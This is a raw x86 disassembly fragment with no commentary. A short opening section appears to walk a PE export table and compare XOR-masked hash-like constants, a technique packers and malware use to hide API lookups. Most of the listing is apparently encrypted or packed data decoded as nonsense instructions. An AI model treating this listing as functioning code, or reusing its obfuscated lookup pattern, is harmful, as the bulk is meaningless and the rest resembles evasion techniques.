  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	jg     0x4063ca
  40635c:	lods   al,BYTE PTR ds:[esi]
  40635d:	cmp    al,0x38
  40635f:	cmp    esp,DWORD PTR [edx+0x62]
  406362:	adc    BYTE PTR [edi+0x62],bl
  406365:	bound  eax,QWORD PTR ds:0x3b0e77c5
  40636b:	(bad)  
  40636c:	xchg   edi,eax
  40636d:	dec    eax
  40636e:	dec    esi
  40636f:	sbb    dh,ch
  406371:	lock sti 
  406373:	mov    eax,0x3b73d2ec
  406378:	or     BYTE PTR [edx],0x1c
  40637b:	sbb    esp,ebp
  40637d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40637e:	cmp    ebx,eax
  406380:	dec    esp
  406381:	mov    al,0x1e
  406383:	xor    bl,BYTE PTR [edx+0x1312ca2]
  406389:	js     0x4063f6
  40638b:	loope  0x4063cc
  40638d:	sbb    BYTE PTR ds:0x4d16ec25,dl
  406393:	dec    edx
  406394:	xchg   DWORD PTR [ecx-0x44cc90ee],esp
  40639a:	mov    esp,0x49552d96
  40639f:	xor    BYTE PTR [esi],cl
  4063a1:	or     eax,DWORD PTR [ebx-0x727b0cfa]
  4063a7:	cmp    bl,bl
  4063a9:	(bad)  
  4063aa:	sar    DWORD PTR [ebp+0x6e],cl
  4063ad:	(bad)  
  4063ae:	mov    ds:0x26d662ba,al
  4063b3:	in     eax,0x9a
  4063b5:	sub    esi,DWORD PTR [edx]
  4063b7:	mov    ah,0x94
  4063b9:	daa    
  4063ba:	fsubr  DWORD PTR [esi]
  4063bc:	adc    eax,0x4e1eae65
  4063c1:	and    al,0xca
  4063c3:	pop    esp
  4063c4:	std    
  4063c5:	or     eax,0xb92cd419
  4063ca:	cld    
  4063cb:	jg     0x40641f
  4063cd:	push   ecx
  4063ce:	test   BYTE PTR [ecx-0x60],0x80
  4063d2:	pop    ebp
  4063d4:	lea    ebx,[ecx]
  4063d6:	mov    ch,0xd2
  4063d8:	dec    edx
  4063d9:	jb     0x406372
  4063db:	inc    esi
  4063dc:	xor    edi,edx
  4063de:	push   edi
  4063df:	pop    eax
  4063e0:	sub    BYTE PTR [eax+0x78213617],al
  4063e6:	mov    esp,0x2a930091
  4063eb:	cli    
  4063ec:	pop    ebp
  4063ed:	xor    al,0x86
  4063ef:	jl     0x4063c3
  4063f1:	cld    
  4063f2:	mov    dh,0x75
  4063f4:	pusha  
  4063f5:	(bad)
  4063f8:	push   ss
  4063f9:	mov    dh,0xed
  4063fb:	or     eax,0x5611f658
  406400:	xchg   ebp,eax
  406401:	xor    edi,ebp
  406403:	jno    0x406405
  406405:	jmp    0x406486
  406407:	stos   DWORD PTR es:[edi],eax
  406408:	jecxz  0x406401
  40640a:	jns    0x4063ce
  40640c:	scas   eax,DWORD PTR es:[edi]
  40640d:	(bad)  
  40640f:	mov    ?,WORD PTR [esi+0x71]
  406412:	jmp    0xbee1:0xc78a7f20
  406419:	sub    dh,BYTE PTR [edx+0x76d71c4a]
  40641f:	mov    ecx,0x77bf051c
  406424:	in     al,dx
  406425:	fistp  QWORD PTR [ebp+0x7bc8d5de]
  40642b:	aam    0xb0
  40642d:	push   0x3a97ea50
  406432:	test   BYTE PTR [ebx],al
  406434:	and    BYTE PTR [edi-0x3d],bl
  406437:	iret   
  406438:	mov    ecx,0xec1ef746
  40643d:	push   ebx
  40643e:	popa   
  40643f:	jmp    0x4063fc
  406441:	(bad)  
  406442:	bound  ecx,QWORD PTR [edx-0x24477b5f]
  406448:	out    0x3,al
  40644a:	aas    
  40644b:	xchg   ebp,eax
  40644c:	cmp    BYTE PTR [esi],dl
  40644e:	push   ecx
  40644f:	pusha  
  406450:	or     ah,bl
  406452:	fnstcw WORD PTR [esi]
  406454:	fs and eax,0x634d2a9c
  40645a:	xchg   ebp,eax
  40645b:	push   ss
  40645c:	mov    BYTE PTR [ebx+ebx*4+0x1727ff21],cl
  406463:	imul   ebx,DWORD PTR [eax+0x7c1b443b],0x52
  40646a:	retf   0x5a84
  40646d:	stc    
  40646e:	fnstsw WORD PTR [eax-0x2e]
  406471:	jo     0x40648b
  406473:	sub    ebp,DWORD PTR [ebx-0x2]
  406476:	cs push esp
  406478:	loop   0x406466
  40647a:	fsubr  DWORD PTR [ebx*1+0x183396e5]
  406481:	push   edx
  406482:	mov    bh,0x0
  406484:	stos   DWORD PTR es:[edi],eax
  406485:	ror    DWORD PTR [eax-0x4],cl
  406488:	jmp    0x4064af
  40648a:	xchg   esi,eax
  40648b:	xor    edx,DWORD PTR [edx]
  40648d:	push   eax
  40648e:	test   al,0x34
  406490:	mov    eax,0xc10c2595
  406495:	sbb    ecx,DWORD PTR [ebx]
  406497:	sbb    BYTE PTR [edx-0x1488640c],bl
  40649d:	test   al,0x3d
  40649f:	cmp    ebx,esp
  4064a1:	sbb    al,0x69
  4064a3:	cld    
  4064a4:	mov    ebp,0x81071044
  4064a9:	mov    dh,0x9c
  4064ab:	loop   0x406500
  4064ad:	enter  0x782,0x86
  4064b1:	sar    edi,1
  4064b3:	sbb    dh,BYTE PTR [esi-0x1c]
  4064b6:	mov    esi,0x94ae2608
  4064bb:	sbb    ecx,esp
  4064bd:	sub    ebx,DWORD PTR [ebp-0x24]
  4064c0:	call   0x6030479f
  4064c5:	adc    esp,DWORD PTR [ebx]
  4064c7:	sbb    BYTE PTR [esi-0x6c],bl
  4064ca:	adc    dh,0x24
  4064cd:	out    dx,al
  4064ce:	mov    ch,0xd5
  4064d0:	adc    esi,DWORD PTR [ebx-0x50f33af5]
  4064d6:	mov    esp,0x323d7a55
  4064db:	icebp  
  4064dc:	call   0x4645be54
  4064e1:	sub    DWORD PTR [ebx-0x4a],ecx
  4064e4:	into   
  4064e5:	sbb    ebp,ebp
  4064e7:	stc    
  4064e8:	or     BYTE PTR [eax-0x6e9c9015],ah
  4064ee:	mov    esi,DWORD PTR [eax+0xed71971]
  4064f4:	mov    esp,0xed5036b9
  4064f9:	pop    edx
  4064fa:	shl    BYTE PTR [ecx],cl
  4064fc:	jae    0x4064ae
  4064fe:	pop    edi
  4064ff:	jle    0x4064f1
  406501:	adc    edi,DWORD PTR [ebp-0x12]
  406504:	stc    
  406505:	fcom   QWORD PTR [ebx+0x38a7bead]
  40650b:	popa   
  40650c:	add    bh,0x61
  40650f:	inc    ebx
  406510:	test   al,0xd
  406512:	sub    BYTE PTR [eax],0x33
  406515:	mov    ds:0x587ea551,eax
  40651a:	jmp    0x510fbf33
  40651f:	push   es
  406520:	cs dec si
  406523:	jp     0x4064c8
  406525:	mov    esi,0x855f5d40
  40652a:	shrd   DWORD PTR [ebx-0x11],esi,0x33
  40652f:	ins    DWORD PTR es:[edi],dx
  406530:	mov    eax,ds:0x416d0386
  406535:	xchg   BYTE PTR [ebx+0x7cf2ff6a],al
  40653b:	xchg   esi,eax
  40653c:	jnp    0x4064de
  40653e:	leave  
  40653f:	test   DWORD PTR [edi],0x6a52b17b
  406545:	jns    0x406515
  406547:	push   edi
  406548:	dec    esp
  406549:	ficomp WORD PTR ds:[ecx-0x6e]
  40654d:	mov    ds:0xc8eaa39d,eax
  406552:	mov    edi,0x8e696428
  406557:	sub    al,0x79
  406559:	test   eax,0xcf469353
  40655e:	fisub  DWORD PTR [edi]
  406560:	dec    ebp
  406561:	bnd jae 0x4065ce
  406564:	and    eax,0xb5431e14
  406569:	xor    esp,DWORD PTR cs:[ecx+eax*8]
  40656d:	and    eax,0x49b6989a
  406572:	mov    ds:0xe5718cfa,eax
  406577:	add    DWORD PTR [esi],eax
  406579:	sbb    ebp,edi
  40657b:	jge    0x406513
  40657d:	xchg   ebx,eax
  40657e:	and    BYTE PTR [ecx],ah
  406580:	xor    al,dl
  406582:	es add al,cl
  406585:	mov    dh,0x3
  406587:	jmp    0x1d0bed29
  40658c:	cld    
  40658d:	in     eax,0x62
  40658f:	cmp    BYTE PTR [edi+0x23e912c5],ch
  406595:	inc    esi
  406596:	xchg   ebx,eax
  406597:	cmp    cl,BYTE PTR [ecx]
  406599:	xor    DWORD PTR [edi-0x629f6a4],0x26d1dd18
  4065a3:	daa    
  4065a4:	xor    BYTE PTR ds:0xc8fcf76e,0x16
  4065ab:	xor    ch,BYTE PTR [ebp-0x443fd52e]
  4065b1:	ret    
  4065b2:	xor    ch,BYTE PTR [ebp-0x779a635c]
  4065b8:	ins    BYTE PTR es:[edi],dx
  4065b9:	iret   
  4065ba:	inc    edi
  4065bb:	outs   dx,BYTE PTR ds:[esi]
  4065bc:	jb     0x40658a
  4065be:	mov    ebp,0x42a38d6e
  4065c3:	add    esi,0xffffff85
  4065c6:	out    0x27,al
  4065c8:	jno    0x40663e
  4065ca:	cld    
  4065cb:	daa    
  4065cc:	cs pop edx
  4065ce:	mov    WORD PTR [ebx-0xff5755b],ds
  4065d4:	inc    ebx
  4065d5:	mov    eax,ds:0x7926ae9b
  4065da:	in     eax,dx
  4065db:	addr16 mov ebx,0x92a7407b
  4065e1:	cli    
  4065e2:	call   0xa1c64de0
  4065e7:	clc    
  4065e8:	out    0xf0,eax
  4065ea:	push   ebp
  4065eb:	sub    eax,0xfc1482c9
  4065f0:	test   bl,dl
  4065f2:	cwde   
  4065f3:	rcl    BYTE PTR [edx],0x89
  4065f6:	jnp    0x40660d
  4065f8:	outs   dx,DWORD PTR ds:[esi]
  4065f9:	adc    al,0x80
  4065fb:	or     ch,BYTE PTR ds:0x511a4d9a
  406601:	cmp    BYTE PTR [edx-0x4a],cl
  406604:	cdq    
  406605:	cmp    DWORD PTR [ecx-0x7b08048a],esi
  40660b:	push   es
  40660c:	(bad)  
  40660d:	fistp  WORD PTR [esi-0x46]
  406610:	pop    ss
  406611:	mov    edx,0x3a02d769
  406616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406617:	ret    0x75fa
  40661a:	enter  0x4de3,0xb4
  40661e:	div    dh
  406620:	xor    eax,0x362f6b96
  406625:	test   BYTE PTR [edx-0x8],dh
  406628:	cld    
  406629:	cmp    BYTE PTR ds:0x515f840e,bh
  40662f:	push   esi
  406630:	mov    cl,0x6a
  406632:	or     edx,0xffffffbf
  406635:	jb     0x40666a
  406637:	bound  eax,QWORD PTR [edx]
  406639:	(bad)  
  40663a:	adc    eax,0x7157ac2a
  40663f:	mov    al,ds:0xd66abbd7
  406644:	inc    esi
  406645:	test   eax,0x5abcd78d
  40664a:	mov    dl,BYTE PTR [ecx+0x7909fa59]
  406650:	mov    al,0xa6
  406652:	sahf   
  406653:	sar    BYTE PTR [edi],1
  406655:	push   edx
  406656:	and    ah,BYTE PTR [ebx+0x7c]
  406659:	daa    
  40665a:	mov    ecx,0xa7c01556
  40665f:	ds (bad) 
  406661:	in     al,0x34
  406663:	int    0xc7
  406665:	jmp    0xe9fa:0xa8b98bea
  40666c:	and    DWORD PTR [ebx-0x2c52453e],0x746f16b1
  406676:	add    DWORD PTR [esi],0xffffffbd
  406679:	sbb    eax,edx
  40667b:	sbb    BYTE PTR [esi+ebp*2],0x2a
  40667f:	in     eax,dx
  406680:	mov    dh,0x56
  406682:	or     dh,dl
  406684:	neg    DWORD PTR [esi]
  406686:	cli    
  406687:	adc    al,0xf9
  406689:	jbe    0x40669a
  40668b:	das    
  40668c:	out    dx,eax
  40668d:	loope  0x4066ff
  40668f:	mov    al,ds:0xa85d47a9
  406694:	mov    WORD PTR ds:0x34ee4560,es
  40669a:	mov    ecx,0x8d6826d2
  40669f:	dec    ebx
  4066a0:	add    BYTE PTR [ecx+0x7cfbe8d],bl
  4066a6:	test   DWORD PTR [esi+0x52],edx
  4066a9:	jne    0x40663b
  4066ab:	fild   DWORD PTR [edi-0x13]
  4066ae:	mov    dl,BYTE PTR [ebp+0x1c4772bb]
  4066b4:	cs inc eax
  4066b6:	and    DWORD PTR [ebp+0x13],edi
  4066b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ba:	(bad)  
  4066bb:	jbe    0x406729
  4066bd:	ds retf 0x5248
  4066c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066c2:	icebp  
  4066c3:	call   0xb88d:0x4e4049cc
  4066ca:	jmp    0x40669e
  4066cc:	mov    ebx,0x978ff20a
  4066d1:	adc    eax,esp
  4066d3:	or     ebp,DWORD PTR [esi]
  4066d5:	icebp  
  4066d6:	(bad)  
  4066d8:	mov    WORD PTR [ebp+0x6b],es
  4066db:	mov    ebp,0x95c53826
  4066e0:	add    eax,esp
  4066e2:	jmp    FWORD PTR gs:[eax+0x79]
  4066e6:	and    esp,DWORD PTR fs:[eax+0x6c72c0a8]
  4066ed:	clc    
  4066ee:	add    esi,DWORD PTR [ecx+0x43]
  4066f1:	or     eax,0x2470a79d
  4066f6:	jae    0x40676b
  4066f8:	mov    bl,0x59
  4066fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066fb:	jb     0x4066f9
  4066fd:	sbb    eax,0x7c2d5341
  406702:	jge    0x40672c
  406704:	ret    0x6cf2
  406707:	and    edx,ebp
  406709:	push   esi
  40670a:	ja     0x406754
  40670c:	mov    al,ds:0xa22a1e4d
  406711:	inc    eax
  406712:	popf   
  406713:	jns    0x40673d
  406715:	cmp    cl,BYTE PTR [ecx]
  406717:	std    
  406718:	retf   
  406719:	lahf   
  40671a:	push   es
  40671b:	test   eax,0x2feee079
  406720:	data16 jp 0x406794
  406723:	xchg   ebp,eax
  406724:	addr16 sbb al,0x49
  406727:	and    eax,0x50d96973
  40672c:	mov    esp,0x8b0d365e
  406731:	jmp    0xb0fd:0xf626a417
  406738:	imul   edx,ecx,0xcdd4b59f
  40673e:	mov    edi,0x3e6107c2
  406743:	push   ds
  406744:	fmul   st(2),st
  406746:	pushf  
  406747:	call   0x39e3b671
  40674c:	retf   
  40674d:	cmp    eax,0xfd76f63a
  406752:	mov    esi,0x211eabec
  406757:	lds    eax,FWORD PTR ds:0x4856b7b6
  40675d:	test   eax,0xd8398aef
  406762:	pop    ebp
  406763:	aam    0x46
  406765:	mov    dh,0xec
  406767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406768:	(bad)  [esi+0x4685b84f]
  40676e:	jmp    0x406740
  406770:	dec    esp
  406771:	push   esp
  406772:	jg     0x4067bc
  406774:	lock jmp FWORD PTR [ebp+eax*4+0xbda7be2]
  40677c:	inc    eax
  40677d:	add    DWORD PTR [ecx+0x9],0x63128c10
  406784:	shr    BYTE PTR [edi-0x54c6d957],cl
  40678a:	shl    DWORD PTR [eax+0x2e6a93e5],cl
  406790:	or     BYTE PTR [edx-0x4c],al
  406793:	loop   0x4067b0
  406795:	mov    al,ds:0x49b4494d
  40679a:	push   ecx
  40679b:	inc    eax
  40679c:	cld    
  40679d:	xchg   edi,eax
  40679e:	sbb    eax,DWORD PTR [esi+0xe68d5a3]
  4067a4:	cs cmp al,0xc
  4067a7:	rcr    BYTE PTR [esi],cl
  4067a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067aa:	jo     0x406816
  4067ac:	xchg   edx,eax
  4067ad:	mov    dh,0x51
  4067af:	mov    ds:0xea502a79,al
  4067b4:	imul   ch
  4067b6:	inc    edi
  4067b7:	fsubr  DWORD PTR ds:0x72e29e69
  4067bd:	xchg   ecx,edx
  4067bf:	adc    eax,0x6ab13566
  4067c4:	fnstsw WORD PTR [eax+0x32]
  4067c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067c8:	mov    bl,BYTE PTR [ebp+0x46]
  4067cb:	mov    bh,0x26
  4067cd:	add    eax,0x234f481e
  4067d2:	cli    
  4067d3:	rcr    BYTE PTR [esi-0x1b0fda23],0x81
  4067da:	ror    DWORD PTR [edi-0x415dfa49],cl
  4067e0:	sbb    ah,al
  4067e2:	cld    
  4067e3:	mov    eax,0x927b1e65
  4067e8:	or     dh,dh
  4067ea:	mov    DWORD PTR [esi-0x274da04f],ebx
  4067f0:	out    0xe0,eax
  4067f2:	rcr    BYTE PTR [edi],cl
  4067f4:	into   
  4067f5:	and    al,0x8d
  4067f7:	xchg   esi,eax
  4067f8:	(bad)  
  4067fa:	mov    ds:0x3921ee79,al
  4067ff:	ins    DWORD PTR es:[edi],dx
  406800:	pop    edx
  406801:	mov    edi,0x5284fdf7
  406806:	xchg   DWORD PTR fs:[ebx],ecx
  406809:	push   ds
  40680a:	cmp    ax,0xa449
  40680e:	jno    0x4067ac
  406810:	imul   edx,DWORD PTR [edx-0x3b0d3f20],0xa99eea30
  40681a:	xor    al,0x8b
  40681c:	(bad)  
  40681d:	sub    edx,DWORD PTR [ebx+eiz*4]
  406820:	add    dh,BYTE PTR [edx-0x47c9aed1]
  406826:	add    al,0xed
  406828:	shl    ecx,1
  40682a:	div    BYTE PTR [edi+ecx*2+0xd89bec0]
  406831:	cld    
  406832:	mov    ebx,0x64ba4674
  406837:	mov    al,0x8e
  406839:	jnp    0x40682e
  40683b:	daa    
  40683c:	add    ecx,DWORD PTR [eax+0x24b3e472]
  406842:	mov    edx,DWORD PTR [edi]
  406844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406845:	xor    eax,DWORD PTR [edi-0x30a2d220]
  40684b:	sar    DWORD PTR ds:0x9f2d6085,0xe7
  406852:	inc    eax
  406853:	jmp    0x5868:0x98ed756f
  40685a:	or     eax,0x9d24d369
  40685f:	mov    dl,0xf7
  406861:	loopne 0x4068c2
  406863:	sub    ecx,eax
  406865:	xchg   DWORD PTR [edx],edx
  406867:	xchg   edx,eax
  406868:	adc    BYTE PTR [eax+eiz*2],ah
  40686b:	push   0xffffff97
  40686d:	sub    ah,bh
  40686f:	add    ch,BYTE PTR [ebx-0x8]
  406872:	mov    ah,0xbc
  406874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406875:	mov    ebx,0x3b3b52fb
  40687a:	xor    bh,ch
  40687c:	dec    ebx
  40687d:	dec    esi
  40687e:	push   0x558ebee5
  406883:	or     cl,BYTE PTR [ebx-0x29]
  406886:	adc    eax,0x4c8fcafc
  40688b:	jno    0x406876
  40688d:	iret   
  40688e:	stos   BYTE PTR es:[edi],al
  40688f:	and    al,0x9
  406891:	mov    ch,0x23
  406893:	lds    edi,FWORD PTR [ecx+0x12129c8e]
  406899:	push   ebp
  40689a:	inc    esp
  40689b:	xchg   BYTE PTR [ecx],dl
  40689d:	mov    ah,0x56
  40689f:	scas   al,BYTE PTR es:[edi]
  4068a0:	inc    ebp
  4068a1:	jmp    0x4068f1
  4068a3:	cmp    cl,BYTE PTR [ebx]
  4068a5:	or     al,0x50
  4068a7:	mov    dh,0xd7
  4068a9:	enter  0xf398,0x22
  4068ad:	adc    al,0xa9
  4068af:	sahf   
  4068b0:	cmp    esp,DWORD PTR [esi+0x5a]
  4068b3:	sar    dh,cl
  4068b5:	xor    eax,0xb72b757f
  4068ba:	xor    al,0xca
  4068bc:	int    0x9b
  4068be:	outs   dx,BYTE PTR ds:[esi]
  4068bf:	lea    eax,[ebx-0x66]
  4068c2:	dec    ebx
  4068c3:	jne    0x406925
  4068c5:	mov    edi,0xa28cffb7
  4068ca:	call   0xfdcb:0xf9d386c
  4068d1:	sbb    dl,BYTE PTR [edi]
  4068d3:	cdq    
  4068d4:	push   ds
  4068d5:	and    BYTE PTR [edx+0x20],dl
  4068d8:	test   al,0x5b
  4068da:	and    eax,0x975db559
  4068df:	pop    ecx
  4068e0:	stc    
  4068e1:	push   es
  4068e2:	arpl   WORD PTR [eax-0x51],di
  4068e5:	lea    ebp,[eax+0x650c4a21]
  4068eb:	cmp    DWORD PTR [edi+ebp*4],esi
  4068ee:	popf   
  4068ef:	xchg   ebp,eax
  4068f0:	ret    0xed29
  4068f3:	mov    DWORD PTR [ecx-0x7eef53bd],eax
  4068f9:	ins    BYTE PTR es:[edi],dx
  4068fa:	mov    al,0x6c
  4068fc:	adc    al,0xb
  4068fe:	xchg   ecx,eax
  4068ff:	sbb    ah,dh
  406901:	jae    0x40690b
  406903:	shr    BYTE PTR [ebp+eax*4+0x2c],cl
  406907:	inc    ecx
  406908:	dec    ebp
  406909:	jb     0x406958
  40690b:	xchg   ecx,eax
  40690c:	lock dec eax
  40690e:	rcr    BYTE PTR [edx-0x7a],0xe5
  406912:	or     BYTE PTR [edi],bh
  406914:	xor    eax,0x2c2e3dae
  406919:	leave  
  40691a:	dec    ebp
  40691b:	fmul   QWORD PTR [ebp-0x3e]
  40691e:	xchg   edx,eax
  40691f:	in     al,0x80
  406921:	jae    0x406969
  406923:	je     0x406983
  406925:	push   edx
  406926:	and    esi,DWORD PTR [esi+0x40]
  406929:	inc    esi
  40692a:	cmp    ecx,esp
  40692c:	clc    
  40692d:	in     eax,dx
  40692e:	cmp    DWORD PTR [esi-0x46],esp
  406931:	jg     0x406906
  406933:	mov    esi,0xf47f363e
  406938:	jle    0x406945
  40693a:	ds out dx,eax
  40693c:	push   es
  40693d:	jle    0x4069b8
  40693f:	fimul  WORD PTR [ebx-0x80]
  406942:	inc    eax
  406943:	add    bh,cl
  406945:	xchg   ebx,eax
  406946:	cmp    BYTE PTR [edx],dl
  406948:	fwait
  406949:	or     al,BYTE PTR [ebp-0x7a1906ea]
  40694f:	jns    0x4069c6
  406951:	stos   DWORD PTR es:[edi],eax
  406952:	in     eax,0x94
  406954:	sub    eax,0x474353d3
  406959:	push   eax
  40695a:	int    0x7
  40695c:	in     eax,dx
  40695d:	icebp  
  40695e:	rcl    DWORD PTR [esp+esi*2-0x6d365e79],0x2b
  406966:	ret    
  406967:	sub    al,dh
  406969:	push   eax
  40696a:	outs   dx,DWORD PTR ds:[esi]
  40696b:	push   ss
  40696c:	stc    
  40696d:	sbb    esi,DWORD PTR [ecx]
  40696f:	lds    eax,FWORD PTR [ebp*2-0x403423d4]
  406976:	xchg   esi,eax
  406977:	imul   esi,DWORD PTR [eax+0x34],0x5ea10907
  40697e:	and    eax,0x7813d373
  406983:	mov    edi,0x959da87e
  406988:	aas    
  406989:	mov    cl,0x1a
  40698b:	out    dx,eax
  40698c:	cld    
  40698d:	cmp    eax,0x14bb6f03
  406992:	add    bl,BYTE PTR [eax-0x7b03da31]
  406998:	shl    DWORD PTR [eax],0x21
  40699b:	shr    DWORD PTR [edi-0x3708a03e],0x3e
  4069a2:	enter  0x381a,0xa6
  4069a6:	sahf   
  4069a7:	scas   eax,DWORD PTR es:[edi]
  4069a8:	test   BYTE PTR [ecx+edi*8],cl
  4069ab:	test   eax,0x7ae67d2
  4069b0:	pop    esi
  4069b1:	jmp    0x6cb91c7f
  4069b6:	jno    0x406991
  4069b8:	dec    ecx
  4069b9:	mov    esp,0x8416894d
  4069be:	das    
  4069bf:	dec    ecx
  4069c0:	sbb    eax,0xd2830529
  4069c5:	out    0x71,eax
  4069c7:	xor    DWORD PTR [ebx+0x4e1e1a8f],esp
  4069cd:	xor    cl,BYTE PTR [eax+0xd540754]
  4069d3:	lods   al,BYTE PTR ds:[esi]
  4069d4:	pop    ebx
  4069d5:	mov    dh,0x9
  4069d7:	pop    ecx
  4069d8:	sub    al,0x14
  4069da:	stc    
  4069db:	popa   
  4069dc:	mov    esi,0x7f472e70
  4069e1:	sahf   
  4069e2:	rcr    DWORD PTR [edi+0x4752e64e],cl
  4069e8:	retf   
  4069e9:	aad    0x47
  4069eb:	jo     0x4069cb
  4069ed:	xor    esp,ecx
  4069ef:	shl    ah,cl
  4069f1:	mov    dh,0x91
  4069f3:	and    al,0xf0
  4069f5:	mov    ebp,0x7954fdce
  4069fa:	mov    ch,0x8e
  4069fc:	clc    
  4069fd:	data16 gs xor ch,cl
  406a01:	int3   
  406a02:	pop    eax
  406a03:	(bad)  
  406a04:	push   edi
  406a05:	push   ebp
  406a06:	sub    al,0x95
  406a08:	cmp    al,0x1d
  406a0a:	popf   
  406a0b:	add    eax,0xe220dde0
  406a10:	xor    DWORD PTR [esi],eax
  406a12:	push   edx
  406a13:	lods   eax,DWORD PTR ds:[esi]
  406a14:	jl     0x406a4c
  406a16:	gs jg  0x4069cd
  406a19:	enter  0x283a,0x47
  406a1d:	jmp    0x17c2:0x9a96519d
  406a24:	add    eax,0x4e11eacc
  406a29:	jp     0x406a36
  406a2b:	fbld   TBYTE PTR [eax+0x1a]
  406a2e:	inc    ecx
  406a2f:	imul   edx,DWORD PTR [esi+0x4e],0x8631532b
  406a36:	ret    
  406a37:	dec    ebp
  406a38:	inc    ebp
  406a39:	xor    edx,ecx
  406a3b:	pop    ebx
  406a3c:	dec    eax
  406a3d:	xor    BYTE PTR [edi],ah
  406a3f:	hlt    
  406a40:	stc    
  406a41:	jg     0x406a5c
  406a43:	cmp    esi,DWORD PTR ds:0xeb7524f1
  406a49:	mov    edi,0xed3845eb
  406a4e:	sbb    edi,ecx
  406a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a51:	pushf  
  406a52:	test   ah,bh
  406a54:	xchg   esi,eax
  406a55:	add    DWORD PTR [edx-0x6f],esp
  406a58:	out    0x83,eax
  406a5a:	jne    0x406a45
  406a5c:	sti    
  406a5d:	int    0x73
  406a5f:	inc    edi
  406a60:	popf   
  406a61:	(bad)  
  406a62:	jb     0x406ab9
  406a64:	loope  0x406a93
  406a66:	pop    ss
  406a67:	mov    BYTE PTR [ebx+eax*8],dh
  406a6a:	mov    edi,0x7084d4e1
  406a6f:	shl    BYTE PTR [edx+0x3b],0x9f
  406a73:	enter  0x64e6,0x7a
  406a77:	in     eax,dx
  406a78:	fistp  QWORD PTR [ebx-0x9a9ec2b]
  406a7e:	loope  0x406a68
  406a80:	loopne 0x406a56
  406a82:	or     BYTE PTR [ecx],dh
  406a84:	add    eax,0xbc4ea213
  406a89:	mov    edx,0xb68d2d44
  406a8e:	rcr    cl,1
  406a90:	adc    DWORD PTR [ecx+ebx*2+0x41],edx
  406a94:	and    ecx,0x4f
  406a97:	sub    BYTE PTR [esi],dh
  406a99:	pop    ebx
  406a9a:	xchg   ebx,eax
  406a9b:	cmp    esp,DWORD PTR [edx-0x58b1cae2]
  406aa1:	jae    0x406a63
  406aa3:	jp     0x406b1a
  406aa5:	js     0x406aed
  406aa7:	mov    ah,0x26
  406aa9:	jp     0x406a72
  406aab:	pop    eax
  406aac:	xor    ebx,esp
  406aae:	scas   al,BYTE PTR es:[edi]
  406aaf:	pop    es
  406ab0:	and    al,0x9e
  406ab2:	mov    ah,0xe0
  406ab4:	jno    0x406b03
  406ab6:	ins    BYTE PTR es:[edi],dx
  406ab7:	dec    esi
  406ab8:	fs add al,0x3e
  406abb:	(bad)  
  406abc:	test   BYTE PTR [edx],0xb0
  406abf:	fcomi  st,st(6)
  406ac1:	push   es
  406ac2:	in     al,0xc2
  406ac4:	(bad)  
  406ac5:	xchg   esp,eax
  406ac6:	adc    BYTE PTR [ecx-0x7f19829d],ch
  406acc:	inc    ebx
  406acd:	sbb    ah,ch
  406acf:	mov    ds:0xade6318b,eax
  406ad4:	cmp    al,0xb3
  406ad6:	sub    ebp,DWORD PTR cs:[ebx]
  406ad9:	dec    esi
  406ada:	sbb    edx,DWORD PTR ds:0x8a4496
  406ae0:	add    cl,BYTE PTR [ebx]
  406ae2:	js     0x406b1c
  406ae4:	sub    DWORD PTR [esi+0x56],edi
  406ae7:	pop    esi
  406ae8:	(bad)  
  406ae9:	and    al,0xa2
  406aeb:	(bad)  
  406aec:	cmp    eax,0xfb695c3f
  406af1:	leave  
  406af2:	mov    al,ds:0x495e75db
  406af7:	test   eax,0x599b8003
  406afc:	iret   
  406afd:	push   eax
  406afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aff:	push   eax
